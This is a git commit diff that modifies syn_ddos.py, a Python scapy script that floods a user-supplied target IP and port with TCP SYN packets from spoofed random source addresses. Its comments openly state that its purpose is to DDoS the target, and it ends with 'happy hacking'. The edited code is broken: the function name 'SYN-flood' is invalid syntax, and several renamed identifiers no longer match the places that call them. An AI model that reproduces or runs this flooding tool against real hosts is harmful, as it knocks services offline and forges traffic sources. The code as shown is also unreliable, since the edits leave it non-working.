65af88354915acad8bc108892130a20e99330b84
Sarthak Gupta <789sk.gupta@gmail.com>
2018-12-31 00:08:26 +0530

    syn_ddos.py

--- violent-python/CH2/syn_ddos.py
+++ violent-python/CH2/syn_ddos.py
@@ -1,14 +1,17 @@
 
 
-# python based code to craft and overhead the tcp/ip network 
+# python based code to craft and overhead the tcp/ip network with fake tcp syn packets 
+# purpose of the code is to ddos the target host as a ddos script/ driven by the user interaction .
 
 from scapy.all import *
 
 import os
 import sys
+
+import time 
 import random
 
-def randomIP():
+def randomIp():
 	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
 	return ip
 
@@ -16,47 +19,58 @@ def randInt():
 	x = random.randint(1000,9000)
 	return x	
 
-def SYN_Flood(dstIP,dstPort,counter):
-	total = 0
-	print "Packets are sending ..."
-	for x in range (0,counter):
+def SYN-flood(destIP,destPort,PACKET_counter):   # defining the syn attack function 
+	
+	total_packets = 0
+	print "Sending tcp-syn packets...."
+	
+	
+	for x in range (0,PACKET_counter): # sending 
+		# defining the values of all of the required  headers of the TCP protocol before sending the packet 
+		
 		s_port = randInt()
 		s_eq = randInt()
 		w_indow = randInt()
 
 		IP_Packet = IP ()
 		IP_Packet.src = randomIP()
-		IP_Packet.dst = dstIP
+		IP_Packet.dst = destIP
 
 		TCP_Packet = TCP ()	
 		TCP_Packet.sport = s_port
-		TCP_Packet.dport = dstPort
-		TCP_Packet.flags = "S"
+		TCP_Packet.dport = destPort
+		TCP_Packet.flags = "S"  # SYN FLAG packet defined here 
 		TCP_Packet.seq = s_eq
 		TCP_Packet.window = w_indow
 
-		send(IP_Packet/TCP_Packet, verbose=0)
+		send(IP_Packet/TCP_Packet, verbose=0)  # finally sending the crafted packet to the target host 
+		
 		total+=1
-	sys.stdout.write("\nTotal packets sent: %i\n" % total)
+	sys.stdout.write("\nTotal packets sent: %i\n" % total_packets)
 
 
 def info():
-	os.system("clear")
-	print "#############################"
-	print "#    github.com/EmreOvunc   #"
-	print "#############################"
-	print "# Welcome to SYN Flood Tool #"
+	 
+		
+	os.system("clear") # clears the screen after the loading of the script 
+	
+	print "# TCP SYN Flooder Tool #"
 	print "#############################"
 
-	dstIP = raw_input ("\nTarget IP : ")
-	dstPort = input ("Target Port : ")
+	destIP = raw_input ("\nTarget IP : ")
+	destPort = input ("Target Port : ")
 	
-	return dstIP,int(dstPort)
+	return destIP,int(destPort)
 	
 
 def main():
 	dstIP,dstPort = info()
-	counter = input ("How many packets do you want to send : ")
-	SYN_Flood(dstIP,dstPort,int(counter))
+	PACKET_counter = input ("Number of tcp-syn packets yu want to send : ")
+	
+	SYN_Flood(dstIP,dstPort,int(PACKET_counter))
 
-main()
+main()  # calling the main driver function 
+
+
+# program ends 
+# happy hacking :)/
